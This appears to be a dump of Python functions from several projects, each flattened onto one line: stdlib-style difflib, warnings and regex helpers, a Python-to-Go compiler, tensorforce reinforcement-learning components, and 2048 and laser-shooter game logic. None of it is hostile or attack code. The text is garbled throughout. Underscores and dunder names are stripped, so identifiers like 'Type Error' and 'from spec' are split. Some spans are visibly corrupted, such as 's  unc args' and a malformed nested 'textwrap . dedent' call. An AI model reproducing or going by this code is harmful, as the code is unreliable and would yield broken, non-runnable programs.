def concat ( a , b ) : if not hasattr ( a , ' getitem ' ) : msg = "'%s' object can't be concatenated" % type ( a ) . name raise Type Error ( msg ) return a + b
def count Of ( a , b ) : count = 0 for i in a : if i == b : count += 1 return count
def index Of ( a , b ) : for i , j in enumerate ( a ) : if j == b : return i else : raise Value Error ( 'sequence.index(x): x not in sequence' )
def iconcat ( a , b ) : if not hasattr ( a , ' getitem ' ) : msg = "'%s' object can't be concatenated" % type ( a ) . name raise Type Error ( msg ) a += b return a
def encode basestring ( s ) : def replace ( match ) : return ESCAPE DCT [ match . group ( 0 ) ] return '"' + ESCAPE . sub ( replace , s ) + '"'
def escape ( pattern ) : s = list ( pattern ) alphanum = alphanum for i , c in enumerate ( pattern ) : if c not in alphanum : if c == "\000" : s [ i ] = "\\000" else : s [ i ] = "\\" + c return pattern [ : 0 ] . join ( s )
def alloc temp ( self , type = '*g.Object') : for v in sorted ( self . free temps , key = lambda k : k . name ) : if v . type == type : self . free temps . remove ( v ) self . used temps . add ( v ) return v self . temp index += 1 name = 'Temp{:03d}'. f ormat( s elf. t emp index) v = expr . Generated Temp Var ( self , name , type ) self . used temps . add ( v ) return v
def free temp ( self , v ) : self . used temps . remove ( v ) self . free temps . add ( v )
def format range unified ( start , stop ) : # Per the diff spec at http://www.unix.org/single unix specification/ beginning = start + 1 # lines start numbering with one length = stop - start if length == 1 : # return '{}'.format(beginning) return '%s' % ( beginning ) if not length : beginning -= 1 # empty ranges begin at line just before the range return '%s,%s' % ( beginning , length )
def format range context ( start , stop ) : # Per the diff spec at http://www.unix.org/single unix specification/ beginning = start + 1 # lines start numbering with one length = stop - start if not length : beginning -= 1 # empty ranges begin at line just before the range if length <= 1 : # return '{}'.format(beginning) return '%s' % ( beginning ) # return '{},{}'.format(beginning, beginning + length - 1) return '%s,%s' % ( beginning , beginning + length - 1 )
def make ( cls , iterable , new = tuple . new , len = len ) : result = new ( cls , iterable ) if len ( result ) != 3 : raise Type Error ( 'Expected 3 arguments, got %d' % len ( result ) ) return result
def dump ( self , tag , x , lo , hi ) : for i in xrange ( lo , hi ) : yield '%s %s' % ( tag , x [ i ] )
def make prefix ( self ) : # Generate a unique anchor prefix so multiple tables # can exist on the same HTML page without conflicts. fromprefix = "from%d " % Html Diff . default prefix toprefix = "to%d " % Html Diff . default prefix Html Diff . default prefix += 1 # store prefixes so line format method has access self . prefix = [ fromprefix , toprefix ]
def convert flags ( self , fromlist , tolist , flaglist , context , numlines ) : # all anchor names will be generated using the unique "to" prefix toprefix = self . prefix [ 1 ] # process change flags, generating middle column of next anchors/links next id = [ '' ] * len ( flaglist ) next href = [ '' ] * len ( flaglist ) num chg , in change = 0 , False last = 0 for i , flag in enumerate ( flaglist ) : if flag : if not in change : in change = True last = i # at the beginning of a change, drop an anchor a few lines # (the context lines) before the change for the previous # link i = max ( [ 0 , i - numlines ] ) next id [ i ] = ' id="difflib chg %s %d"' % ( toprefix , num chg ) # at the beginning of a change, drop a link to the next # change num chg += 1 next href [ last ] = '<a href="#difflib chg %s %d">n</a>' % ( toprefix , num chg ) else : in change = False # check for cases where there is no content to avoid exceptions if not flaglist : flaglist = [ False ] next id = [ '' ] next href = [ '' ] last = 0 if context : fromlist = [ '<td></td><td>&nbsp;No Differences Found&nbsp;</td>' ] tolist = fromlist else : fromlist = tolist = [ '<td></td><td>&nbsp;Empty File&nbsp;</td>' ] # if not a change on first line, drop a link if not flaglist [ 0 ] : next href [ 0 ] = '<a href="#difflib chg %s 0">f</a>' % toprefix # redo the last link to link to the top next href [ last ] = '<a href="#difflib chg %s top">t</a>' % ( toprefix ) return fromlist , tolist , flaglist , next href , next id
def Make Parallel Benchmark ( p , work func , * args ) : def Benchmark ( b ) : # pylint: disable=missing-docstring e = threading . Event ( ) def Target ( ) : e . wait ( ) for in xrange ( b . N / p ) : work func ( * args ) threads = [ ] for in xrange ( p ) : t = threading . Thread ( target = Target ) t . start ( ) threads . append ( t ) b . Reset Timer ( ) e . set ( ) for t in threads : t . join ( ) return Benchmark
def visit function inline ( self , node ) : # First pass collects the names of locals used in this function. Do this in # a separate pass so that we know whether to resolve a name as a local or a # global during the second pass. func visitor = block . Function Block Visitor ( node ) for child in node . body : func visitor . visit ( child ) func block = block . Function Block ( self . block , node . name , func visitor . vars , func visitor . is generator ) visitor = Statement Visitor ( func block , self . future node ) # Indent so that the function body is aligned with the goto labels. with visitor . writer . indent block ( ) : visitor . visit each ( node . body ) # pylint: disable=protected-access result = self . block . alloc temp ( ) with self . block . alloc temp ( '[]g.Param')   s  unc args: args = node . args argc = len ( args . args ) self . writer . write ( '{} = make([]g.Param, {})'. f ormat( func args . expr , argc ) ) # The list of defaults only contains args for which a default value is # specified so pad it with None to make it the same length as args. defaults = [ None ] * ( argc - len ( args . defaults ) ) + args . defaults for i , ( a , d ) in enumerate ( zip ( args . args , defaults ) ) : with self . visit expr ( d ) if d else expr . nil expr as default : tmpl = '$args[$i] = g.Param{Name: $name, Def: $default}' self . writer . write tmpl ( tmpl , args = func args . expr , i = i , name = util . go str ( a . arg ) , default = default . expr ) flags = [ ] if args . vararg : flags . append ( 'g.Code Flag Var Arg') if args . kwarg : flags . append ( 'g.Code Flag KW Arg') # The function object gets written to a temporary writer because we need # it as an expression that we subsequently bind to some variable. self . writer . write tmpl ( '$result = g.New Function(g.New Code($name, $filename, $args, ' '$flags, func(F *g.Frame, Args []*g.Object) ' '(*g.Object, *g.Base Exception) {', result = result . name , name = util . go str ( node . name ) , filename = util . go str ( self . block . root . filename ) , args = func args . expr , flags = ' | ' . join ( flags ) if flags else 0 ) with self . writer . indent block ( ) : for var in func block . vars . values ( ) : if var . type != block . Var . TYPE GLOBAL : fmt = 'var {0} *g.Object = {1};   = {0}' self . writer . write ( fmt . format ( util . adjust local name ( var . name ) , var . init expr ) ) self . writer . write temp decls ( func block ) self . writer . write ( 'var R *g.Object;   = R') self . writer . write ( 'var E *g.Base Exception;   = E') if func block . is generator : self . writer . write ( 'return g.New Generator(F, func(Sent *g.Object) ' '(*g.Object, *g.Base Exception) {') with self . writer . indent block ( ) : self . writer . write block ( func block , visitor . writer . getvalue ( ) ) self . writer . write ( 'return nil, E') self . writer . write ( '}).To Object(), nil' ) else : self . writer . write block ( func block , visitor . writer . getvalue ( ) ) self . writer . write ( textwrap . dedent ( self . writer . write ( '}), F.Globals()).To Object()') return result
def listdir ( path ) : try : cached mtime , list = cache [ path ] del cache [ path ] except Key Error : cached mtime , list = - 1 , [ ] mtime = os . stat ( path ) . st mtime if mtime != cached mtime : list = os . listdir ( path ) list . sort ( ) cache [ path ] = mtime , list return list
def pformat ( o , indent = 1 , width = 80 , depth = None ) : return Pretty Printer ( indent = indent , width = width , depth = depth ) . pformat ( o )
def Tok ( kind , loc = None ) : @ llrule ( loc , lambda parser : [ kind ] ) def rule ( parser ) : return parser . accept ( kind ) return rule
def Loc ( kind , loc = None ) : @ llrule ( loc , lambda parser : [ kind ] ) def rule ( parser ) : result = parser . accept ( kind ) if result is unmatched : return result return result . loc return rule
def Rule ( name , loc = None ) : @ llrule ( loc , lambda parser : getattr ( parser , name ) . expected ( parser ) ) def rule ( parser ) : return getattr ( parser , name ) ( ) return rule
def Expect ( inner rule , loc = None ) : @ llrule ( loc , inner rule . expected ) def rule ( parser ) : result = inner rule ( parser ) if result is unmatched : expected = reduce ( list . add , [ rule . expected ( parser ) for rule in parser . errrules ] ) expected = list ( sorted ( set ( expected ) ) ) if len ( expected ) > 1 : expected = " or " . join ( [ ", " . join ( expected [ 0 : - 1 ] ) , expected [ - 1 ] ] ) elif len ( expected ) == 1 : expected = expected [ 0 ] else : expected = "(impossible)" error tok = parser . tokens [ parser . errindex ] error = diagnostic . Diagnostic ( "fatal" , "unexpected {actual}: expected {expected}" , { "actual" : error tok . kind , "expected" : expected } , error tok . loc ) parser . diagnostic engine . process ( error ) return result return rule
def Newline ( loc = None ) : @ llrule ( loc , lambda parser : [ "newline" ] ) def rule ( parser ) : result = parser . accept ( "newline" ) if result is unmatched : return result return [ ] return rule
def replace ( self , * * kwds ) : result = self . make ( map ( kwds . pop , ( 'scheme' , 'netloc' , 'path' , 'query' , 'fragment' ) , self ) ) if kwds : raise Value Error ( 'Got unexpected field names: %r' % kwds . keys ( ) ) return result
def isfile ( path ) : try : st = os . stat ( path ) except os . error : return False return stat . S ISREG ( st . st mode )
def isdir ( s ) : try : st = os . stat ( s ) except os . error : return False return stat . S ISDIR ( st . st mode )
def commonprefix ( m ) : if not m : return '' s1 = min ( m ) s2 = max ( m ) for i , c in enumerate ( s1 ) : if c != s2 [ i ] : return s1 [ : i ] return s1
def bytelist2long Big Endian ( list ) : imax = len ( list ) // 4 hl = [ 0 ] * imax j = 0 i = 0 while i < imax : b0 = ord ( list [ j ] ) << 24 b1 = ord ( list [ j + 1 ] ) << 16 b2 = ord ( list [ j + 2 ] ) << 8 b3 = ord ( list [ j + 3 ] ) hl [ i ] = b0 | b1 | b2 | b3 i = i + 1 j = j + 4 return hl
def init ( self ) : self . length = 0 self . input = [ ] # Initial 160 bit message digest (5 times 32 bit). self . H0 = 0x67452301 self . H1 = 0x EFCDAB89 self . H2 = 0x98BADCFE self . H3 = 0x10325476 self . H4 = 0x C3D2E1F0
def show warning ( message , category , filename , lineno , file = None , line = None ) : if file is None : file = sys . stderr if file is None : # sys.stderr is None - warnings get lost return try : file . write ( formatwarning ( message , category , filename , lineno , line ) ) except ( IO Error , Unicode Error ) : pass # the file (probably stderr) is invalid - this warning gets lost.
def formatwarning ( message , category , filename , lineno , line = None ) : try : unicodetype = unicode except Name Error : unicodetype = ( ) try : message = str ( message ) except Unicode Encode Error : pass s = "%s: %s: %s\n" % ( lineno , category . name , message ) line = linecache . getline ( filename , lineno ) if line is None else line if line : line = line . strip ( ) if isinstance ( s , unicodetype ) and isinstance ( line , str ) : line = unicode ( line , 'latin1' ) s += "  %s\n" % line if isinstance ( s , unicodetype ) and isinstance ( filename , str ) : enc = sys . getfilesystemencoding ( ) if enc : try : filename = unicode ( filename , enc ) except Unicode Decode Error : pass s = "%s:%s" % ( filename , s ) return s
def warn ( message , category = None , stacklevel = 1 ) : # Check if message is already a Warning object if isinstance ( message , Warning ) : category = message . class # Check category argument if category is None : category = User Warning assert issubclass ( category , Warning ) # Get context information try : caller = sys . getframe ( stacklevel ) except Value Error : globals = sys . dict lineno = 1 else : globals = caller . f globals lineno = caller . f lineno if ' name ' in globals : module = globals [ ' name ' ] else : module = "<string>" filename = globals . get ( ' file ' ) if filename : fnl = filename . lower ( ) if fnl . endswith ( ( ".pyc" , ".pyo" ) ) : filename = filename [ : - 1 ] else : if module == " main " : try : filename = sys . argv [ 0 ] except Attribute Error : # embedded interpreters don't have sys.argv, see bug #839151 filename = ' main ' if not filename : filename = module registry = globals . setdefault ( " warningregistry " , { } ) warn explicit ( message , category , filename , lineno , module , registry , globals )
def remove ( self , value ) : if value not in self : raise Key Error ( value ) self . discard ( value )
def pop ( self ) : it = iter ( self ) try : value = next ( it ) except Stop Iteration : raise Key Error self . discard ( value ) return value
def go str ( value ) : io = String IO . String IO ( ) io . write ( '"' ) for c in value : if c in ESCAPES : io . write ( ESCAPES [ c ] ) elif c in SIMPLE CHARS : io . write ( c ) else : io . write ( r'\x{:02x}' . format ( ord ( c ) ) ) io . write ( '"' ) return io . getvalue ( )
def dump registry ( cls , file = None ) : print >> file , "Class: %s.%s" % ( cls . module , cls . name ) print >> file , "Inv.counter: %s" % ABC Meta . abc invalidation counter for name in sorted ( cls . dict . keys ( ) ) : if name . startswith ( " abc " ) : value = getattr ( cls , name ) print >> file , "%s: %r" % ( name , value )
def format option strings ( self , option ) : if option . takes value ( ) : metavar = option . metavar or option . dest . upper ( ) short opts = [ self . short opt fmt % ( sopt , metavar ) for sopt in option . short opts ] long opts = [ self . long opt fmt % ( lopt , metavar ) for lopt in option . long opts ] else : short opts = option . short opts long opts = option . long opts if self . short first : opts = short opts + long opts else : opts = long opts + short opts return ", " . join ( opts )
def reverse ( self ) : leftblock = self . left rightblock = self . right leftindex = self . leftndx rightindex = self . rightndx for i in range ( self . length // 2 ) : # Validate that pointers haven't met in the middle assert leftblock != rightblock or leftindex < rightindex # Swap ( rightblock [ rightindex ] , leftblock [ leftindex ] ) = ( leftblock [ leftindex ] , rightblock [ rightindex ] ) # Advance left block/index pair leftindex += 1 if leftindex == n : leftblock = leftblock [ RGTLNK ] assert leftblock is not None leftindex = 0 # Step backwards with the right block/index pair rightindex -= 1 if rightindex == - 1 : rightblock = rightblock [ LFTLNK ] assert rightblock is not None rightindex = n - 1
def findall ( self , string , pos = 0 , endpos = sys . maxint ) : matchlist = [ ] state = State ( string , pos , endpos , self . flags ) while state . start <= state . end : state . reset ( ) state . string position = state . start if not state . search ( self . code ) : break match = SRE Match ( self , state ) if self . groups == 0 or self . groups == 1 : item = match . group ( self . groups ) else : item = match . groups ( "" ) matchlist . append ( item ) if state . string position == state . start : state . start += 1 else : state . start = state . string position return matchlist
def split ( self , string , maxsplit = 0 ) : splitlist = [ ] state = State ( string , 0 , sys . maxint , self . flags ) n = 0 last = state . start while not maxsplit or n < maxsplit : state . reset ( ) state . string position = state . start if not state . search ( self . code ) : break if state . start == state . string position : # zero-width match if last == state . end : # or end of string break state . start += 1 continue splitlist . append ( string [ last : state . start ] ) # add groups (if any) if self . groups : match = SRE Match ( self , state ) # TODO: Use .extend once it is implemented. # splitlist.extend(list(match.groups(None))) splitlist += ( list ( match . groups ( None ) ) ) n += 1 last = state . start = state . string position splitlist . append ( string [ last : state . end ] ) return splitlist
def finditer ( self , string , pos = 0 , endpos = sys . maxint ) : scanner = self . scanner ( string , pos , endpos ) return iter ( scanner . search , None )
def create regs ( self , state ) : regs = [ ( state . start , state . string position ) ] for group in range ( self . re . groups ) : mark index = 2 * group if mark index + 1 < len ( state . marks ) and state . marks [ mark index ] is not None and state . marks [ mark index + 1 ] is not None : regs . append ( ( state . marks [ mark index ] , state . marks [ mark index + 1 ] ) ) else : regs . append ( ( - 1 , - 1 ) ) return tuple ( regs )
def unexpo ( intpart , fraction , expo ) : if expo > 0 : # Move the point left f = len ( fraction ) intpart , fraction = intpart + fraction [ : expo ] , fraction [ expo : ] if expo > f : intpart = intpart + '0' * ( expo - f ) elif expo < 0 : # Move the point right i = len ( intpart ) intpart , fraction = intpart [ : expo ] , intpart [ expo : ] + fraction if expo < - i : fraction = '0' * ( - expo - i ) + fraction return intpart , fraction
def roundfrac ( intpart , fraction , digs ) : f = len ( fraction ) if f <= digs : return intpart , fraction + '0' * ( digs - f ) i = len ( intpart ) if i + digs < 0 : return '0' * - digs , '' total = intpart + fraction nextdigit = total [ i + digs ] if nextdigit >= '5' : # Hard case: increment last digit, may have carry! n = i + digs - 1 while n >= 0 : if total [ n ] != '9' : break n = n - 1 else : total = '0' + total i = i + 1 n = 0 total = total [ : n ] + chr ( ord ( total [ n ] ) + 1 ) + '0' * ( len ( total ) - n - 1 ) intpart , fraction = total [ : i ] , total [ i : ] if digs >= 0 : return intpart , fraction [ : digs ] else : return intpart [ : digs ] + '0' * - digs , ''
def filter ( names , pat ) : import os # import posixpath result = [ ] # pat=os.path.normcase(pat) try : re pat = cache [ pat ] except Key Error : res = translate ( pat ) if len ( cache ) >= MAXCACHE : #  cache.clear() globals ( ) [ ' cache' ] = { } cache [ pat ] = re pat = re . compile ( res ) match = re pat . match # if os.path is posixpath: if 1 : # normcase on posix is NOP. Optimize it away from the loop. for name in names : if match ( name ) : result . append ( name ) else : for name in names : if match ( os . path . normcase ( name ) ) : result . append ( name ) return result
def calculate transitive deps ( modname , script , gopath ) : deps = set ( ) def calc ( modname , script ) : if modname in deps : return deps . add ( modname ) for imp in collect imports ( modname , script , gopath ) : if imp . is native : deps . add ( imp . name ) continue parts = imp . name . split ( '.' ) calc ( imp . name , imp . script ) if len ( parts ) == 1 : continue # For submodules, the parent packages are also deps. package dir , filename = os . path . split ( imp . script ) if filename == ' init .py' : package dir = os . path . dirname ( package dir ) for i in xrange ( len ( parts ) - 1 , 0 , - 1 ) : modname = '.' . join ( parts [ : i ] ) script = os . path . join ( package dir , ' init .py' ) calc ( modname , script ) package dir = os . path . dirname ( package dir ) calc ( modname , script ) deps . remove ( modname ) return deps
def make future features ( node ) : assert isinstance ( node , ast . Import From ) assert node . module == ' future ' features = Future Features ( ) for alias in node . names : name = alias . name if name in FUTURE FEATURES : if name not in IMPLEMENTED FUTURE FEATURES : msg = 'future feature {} not yet implemented by grumpy' . format ( name ) raise util . Parse Error ( node , msg ) setattr ( features , name , True ) elif name == 'braces' : raise util . Parse Error ( node , 'not a chance' ) elif name not in REDUNDANT FUTURE FEATURES : msg = 'future feature {} is not defined' . format ( name ) raise util . Parse Error ( node , msg ) return features
def parse future features ( mod ) : assert isinstance ( mod , ast . Module ) found docstring = False for node in mod . body : if isinstance ( node , ast . Import From ) : if node . module == ' future ' : return node , make future features ( node ) break elif isinstance ( node , ast . Expr ) and not found docstring : if not isinstance ( node . value , ast . Str ) : break found docstring = True else : break return None , Future Features ( )
def from spec ( spec , kwargs = None ) : baseline = util . get object ( obj = spec , predefined objects = tensorforce . core . baselines . baselines , kwargs = kwargs ) assert isinstance ( baseline , Baseline ) return baseline
def from spec ( spec , kwargs = None ) : layer = util . get object ( obj = spec , predefined objects = tensorforce . core . networks . layers , kwargs = kwargs ) assert isinstance ( layer , Layer ) return layer
def from spec ( spec , kwargs ) : env = tensorforce . util . get object ( obj = spec , predefined objects = tensorforce . environments . environments , kwargs = kwargs ) assert isinstance ( env , Environment ) return env
def setup ( app ) : global is sphinx is sphinx = True app . add config value ( 'no underscore emphasis' , False , 'env' ) app . add source parser ( '.md' , M2R Parser ) app . add directive ( 'mdinclude' , Md Include )
def output image link ( self , m ) : return self . renderer . image link ( m . group ( 'url' ) , m . group ( 'target' ) , m . group ( 'alt' ) )
def output eol literal marker ( self , m ) : marker = ':' if m . group ( 1 ) is None else '' return self . renderer . eol literal marker ( marker )
def Worker Agent Generator ( agent class ) : # Support special case where class is given as type-string (Agents Dictionary) or class-name-string. if isinstance ( agent class , str ) : agent class = Agents Dictionary . get ( agent class ) # Last resort: Class name given as string? if not agent class and agent class . find ( '.' ) != - 1 : module name , function name = agent class . rsplit ( '.' , 1 ) module = importlib . import module ( module name ) agent class = getattr ( module , function name ) class Worker Agent ( agent class ) : def init ( self , model = None , * * kwargs ) : # Set our model externally. self . model = model # Be robust against `network` coming in from kwargs even though this agent doesn't have one if not issubclass ( agent class , Learning Agent ) : kwargs . pop ( "network" ) # Call super c'tor (which will call initialize model and assign self.model to the return value). super ( Worker Agent , self ) . init ( * * kwargs ) def initialize model ( self ) : # Return our model (already given and initialized). return self . model return Worker Agent
def wait state ( self , state , reward , terminal ) : while state == [ None ] or not state : state , terminal , reward = self . execute ( dict ( key = 0 ) ) return state , terminal , reward
def from spec ( spec , kwargs = None ) : optimizer = util . get object ( obj = spec , predefined objects = tensorforce . core . optimizers . optimizers , kwargs = kwargs ) assert isinstance ( optimizer , Optimizer ) return optimizer
def register saver ops ( self ) : variables = self . get savable variables ( ) if variables is None or len ( variables ) == 0 : self . saver = None return base scope = self . get base variable scope ( ) variables map = { strip name scope ( v . name , base scope ) : v for v in variables } self . saver = tf . train . Saver ( var list = variables map , reshape = False , sharded = False , max to keep = 5 , keep checkpoint every n hours = 10000.0 , name = None , restore sequentially = False , saver def = None , builder = None , defer build = False , allow empty = True , write version = tf . train . Saver Def . V2 , pad step number = False , save relative paths = True )
def from spec ( spec , kwargs = None ) : if isinstance ( spec , dict ) : spec = [ spec ] stack = Preprocessor Stack ( ) for preprocessor spec in spec : # need to deep copy, otherwise will add first processors spec  to kwargs to second processor preprocessor kwargs = copy . deepcopy ( kwargs ) preprocessor = util . get object ( obj = preprocessor spec , predefined objects = tensorforce . core . preprocessors . preprocessors , kwargs = preprocessor kwargs ) assert isinstance ( preprocessor , Preprocessor ) stack . preprocessors . append ( preprocessor ) return stack
def as local model ( self ) : super ( Memory Model , self ) . as local model ( ) self . optimizer spec = dict ( type = 'global optimizer' , optimizer = self . optimizer spec )
def from spec ( spec , kwargs = None ) : distribution = util . get object ( obj = spec , predefined objects = tensorforce . core . distributions . distributions , kwargs = kwargs ) assert isinstance ( distribution , Distribution ) return distribution
def from spec ( spec , kwargs ) : agent = util . get object ( obj = spec , predefined objects = tensorforce . agents . agents , kwargs = kwargs ) assert isinstance ( agent , Agent ) return agent
def from spec ( spec , kwargs = None ) : network = util . get object ( obj = spec , default object = Layered Network , kwargs = kwargs ) assert isinstance ( network , Network ) return network
def move ( self , external index , new priority ) : index = external index + ( self . capacity - 1 ) return self . move ( index , new priority )
def move ( self , index , new priority ) : item , old priority = self . memory [ index ] old priority = old priority or 0 self . memory [ index ] = Sum Row ( item , new priority ) self . update internal nodes ( index , new priority - old priority )
def next position then increment ( self ) : start = self . capacity - 1 position = start + self . position self . position = ( self . position + 1 ) % self . capacity return position
def sample with priority ( self , p ) : parent = 0 while True : left = 2 * parent + 1 if left >= len ( self . memory ) : # parent points to a leaf node already. return parent left p = self . memory [ left ] if left < self . capacity - 1 else ( self . memory [ left ] . priority or 0 ) if p <= left p : parent = left else : if left + 1 >= len ( self . memory ) : raise Runtime Error ( 'Right child is expected to exist.' ) p -= left p parent = left + 1
def sample minibatch ( self , batch size ) : pool size = len ( self ) if pool size == 0 : return [ ] delta p = self . memory [ 0 ] / batch size chosen idx = [ ] # if all priorities sum to ~0  choose randomly otherwise random sample if abs ( self . memory [ 0 ] ) < util . epsilon : chosen idx = np . random . randint ( self . capacity - 1 , self . capacity - 1 + len ( self ) , size = batch size ) . tolist ( ) else : for i in xrange ( batch size ) : lower = max ( i * delta p , 0 ) upper = min ( ( i + 1 ) * delta p , self . memory [ 0 ] ) p = random . uniform ( lower , upper ) chosen idx . append ( self . sample with priority ( p ) ) return [ ( i , self . memory [ i ] ) for i in chosen idx ]
def disconnect ( self ) : # If we are not connected, return error. if not self . socket : logging . warning ( "No active socket to close!" ) return # Close our socket. self . socket . close ( ) self . socket = None
def is action available left ( self , state ) : # True if any field is 0 (empty) on the left of a tile or two tiles can # be merged. for row in range ( 4 ) : has empty = False for col in range ( 4 ) : has empty |= state [ row , col ] == 0 if state [ row , col ] != 0 and has empty : return True if ( state [ row , col ] != 0 and col > 0 and state [ row , col ] == state [ row , col - 1 ] ) : return True return False
def do action ( self , action ) : temp state = np . rot90 ( self . state , action ) reward = self . do action left ( temp state ) self . state = np . rot90 ( temp state , - action ) self . score += reward self . add random tile ( ) return reward
def do action left ( self , state ) : reward = 0 for row in range ( 4 ) : # Always the rightmost tile in the current row that was already moved merge candidate = - 1 merged = np . zeros ( ( 4 , ) , dtype = np . bool ) for col in range ( 4 ) : if state [ row , col ] == 0 : continue if ( merge candidate != - 1 and not merged [ merge candidate ] and state [ row , merge candidate ] == state [ row , col ] ) : # Merge tile with merge candidate state [ row , col ] = 0 merged [ merge candidate ] = True state [ row , merge candidate ] += 1 reward += 2 ** state [ row , merge candidate ] else : # Move tile to the left merge candidate += 1 if col != merge candidate : state [ row , merge candidate ] = state [ row , col ] state [ row , col ] = 0 return reward
def add random tile ( self ) : x pos , y pos = np . where ( self . state == 0 ) assert len ( x pos ) != 0 empty index = np . random . choice ( len ( x pos ) ) value = np . random . choice ( [ 1 , 2 ] , p = [ 0.9 , 0.1 ] ) self . state [ x pos [ empty index ] , y pos [ empty index ] ] = value
def print state ( self ) : def tile string ( value ) : """Concert value to string.""" if value > 0 : return '% 5d' % ( 2 ** value , ) return "     " separator line = '-' * 25 print ( separator line ) for row in range ( 4 ) : print ( "|" + "|" . join ( [ tile string ( v ) for v in self . state [ row , : ] ] ) + "|" ) print ( separator line )
def setup saver ( self ) : if self . execution type == "single" : global variables = self . get variables ( include submodules = True , include nontrainable = True ) else : global variables = self . global model . get variables ( include submodules = True , include nontrainable = True ) # global variables += [self.global episode, self.global timestep] for c in self . get savable components ( ) : c . register saver ops ( ) # Tensor Flow saver object # TODO potentially make other options configurable via saver spec. self . saver = tf . train . Saver ( var list = global variables , # should be given? reshape = False , sharded = False , max to keep = 5 , keep checkpoint every n hours = 10000.0 , name = None , restore sequentially = False , saver def = None , builder = None , defer build = False , allow empty = True , write version = tf . train . Saver Def . V2 , pad step number = False , save relative paths = True # filename=None )
def make game ( ) : return ascii art . ascii art to game ( GAME ART , what lies beneath = ' ' , sprites = dict ( [ ( 'P' , Player Sprite ) ] + [ ( c , Upward Laser Bolt Sprite ) for c in UPWARD BOLT CHARS ] + [ ( c , Downward Laser Bolt Sprite ) for c in DOWNWARD BOLT CHARS ] ) , drapes = dict ( X = Marauder Drape , B = Bunker Drape ) , update schedule = [ 'P' , 'B' , 'X' ] + list ( ALL BOLT CHARS ) )
def fly ( self , board , layers , things , the plot ) : # Disappear if we've hit a Marauder or a bunker. if ( self . character in the plot [ 'bunker hitters' ] or self . character in the plot [ 'marauder hitters' ] ) : return self . teleport ( ( - 1 , - 1 ) ) # Otherwise, northward! self . north ( board , the plot )
def fire ( self , layers , things , the plot ) : # We don't fire if the player fired another bolt just now. if the plot . get ( 'last player shot' ) == the plot . frame : return the plot [ 'last player shot' ] = the plot . frame # We start just above the player. row , col = things [ 'P' ] . position self . teleport ( ( row - 1 , col ) )
def fly ( self , board , layers , things , the plot ) : # Disappear if we've hit a bunker. if self . character in the plot [ 'bunker hitters' ] : return self . teleport ( ( - 1 , - 1 ) ) # End the game if we've hit the player. if self . position == things [ 'P' ] . position : the plot . terminate episode ( ) self . south ( board , the plot )
def fire ( self , layers , the plot ) : # We don't fire if another Marauder fired a bolt just now. if the plot . get ( 'last marauder shot' ) == the plot . frame : return the plot [ 'last marauder shot' ] = the plot . frame # Which Marauder should fire the laser bolt? col = np . random . choice ( np . nonzero ( layers [ 'X' ] . sum ( axis = 0 ) ) [ 0 ] ) row = np . nonzero ( layers [ 'X' ] [ : , col ] ) [ 0 ] [ - 1 ] + 1 # Move ourselves just below that Marauder. self . teleport ( ( row , col ) )
def from spec ( spec ) : exploration = util . get object ( obj = spec , predefined objects = tensorforce . core . explorations . explorations ) assert isinstance ( exploration , Exploration ) return exploration
def from spec ( spec , kwargs = None ) : memory = util . get object ( obj = spec , predefined objects = tensorforce . core . memories . memories , kwargs = kwargs ) assert isinstance ( memory , Memory ) return memory
def parse lheading ( self , m ) : self . tokens . append ( { 'type' : 'heading' , 'level' : 1 if m . group ( 2 ) == '=' else 2 , 'text' : m . group ( 1 ) , } )
def process docstring ( app , what , name , obj , options , lines ) : markdown = "\n" . join ( lines ) # ast = cm parser.parse(markdown) # html = cm renderer.render(ast) rest = m2r ( markdown ) rest . replace ( "\r\n" , "\n" ) del lines [ : ] lines . extend ( rest . split ( "\n" ) )
def setup components and tf funcs ( self , custom getter = None ) : custom getter = super ( Q Demo Model , self ) . setup components and tf funcs ( custom getter ) self . demo memory = Replay ( states = self . states spec , internals = self . internals spec , actions = self . actions spec , include next states = True , capacity = self . demo memory capacity , scope = 'demo-replay' , summary labels = self . summary labels ) # Import demonstration optimization. self . fn import demo experience = tf . make template ( name = 'import-demo-experience' , func = self . tf import demo experience , custom getter = custom getter ) # Demonstration loss. self . fn demo loss = tf . make template ( name = 'demo-loss' , func = self . tf demo loss , custom getter = custom getter ) # Combined loss. self . fn combined loss = tf . make template ( name = 'combined-loss' , func = self . tf combined loss , custom getter = custom getter ) # Demonstration optimization. self . fn demo optimization = tf . make template ( name = 'demo-optimization' , func = self . tf demo optimization , custom getter = custom getter ) return custom getter
def tf import demo experience ( self , states , internals , actions , terminal , reward ) : return self . demo memory . store ( states = states , internals = internals , actions = actions , terminal = terminal , reward = reward )
def tf demo loss ( self , states , actions , terminal , reward , internals , update , reference = None ) : embedding = self . network . apply ( x = states , internals = internals , update = update ) deltas = list ( ) for name in sorted ( actions ) : action = actions [ name ] distr params = self . distributions [ name ] . parameterize ( x = embedding ) state action value = self . distributions [ name ] . state action value ( distr params = distr params , action = action ) # Create the supervised margin loss # Zero for the action taken, one for all other actions, now multiply by expert margin if self . actions spec [ name ] [ 'type' ] == 'bool' : num actions = 2 action = tf . cast ( x = action , dtype = util . tf dtype ( 'int' ) ) else : num actions = self . actions spec [ name ] [ 'num actions' ] one hot = tf . one hot ( indices = action , depth = num actions ) ones = tf . ones like ( tensor = one hot , dtype = tf . float32 ) inverted one hot = ones - one hot # max a([Q(s,a) + l(s,a E,a)], l(s,a E, a) is 0 for expert action and margin value for others state action values = self . distributions [ name ] . state action value ( distr params = distr params ) state action values = state action values + inverted one hot * self . expert margin supervised selector = tf . reduce max ( input tensor = state action values , axis = - 1 ) # J E(Q) = max a([Q(s,a) + l(s,a E,a)] - Q(s,a E) delta = supervised selector - state action value action size = util . prod ( self . actions spec [ name ] [ 'shape' ] ) delta = tf . reshape ( tensor = delta , shape = ( - 1 , action size ) ) deltas . append ( delta ) loss per instance = tf . reduce mean ( input tensor = tf . concat ( values = deltas , axis = 1 ) , axis = 1 ) loss per instance = tf . square ( x = loss per instance ) return tf . reduce mean ( input tensor = loss per instance , axis = 0 )
def tf combined loss ( self , states , internals , actions , terminal , reward , next states , next internals , update , reference = None ) : q model loss = self . fn loss ( states = states , internals = internals , actions = actions , terminal = terminal , reward = reward , next states = next states , next internals = next internals , update = update , reference = reference ) demo loss = self . fn demo loss ( states = states , internals = internals , actions = actions , terminal = terminal , reward = reward , update = update , reference = reference ) return q model loss + self . supervised weight * demo loss
def import demo experience ( self , states , internals , actions , terminal , reward ) : fetches = self . import demo experience output feed dict = self . get feed dict ( states = states , internals = internals , actions = actions , terminal = terminal , reward = reward ) self . monitored session . run ( fetches = fetches , feed dict = feed dict )
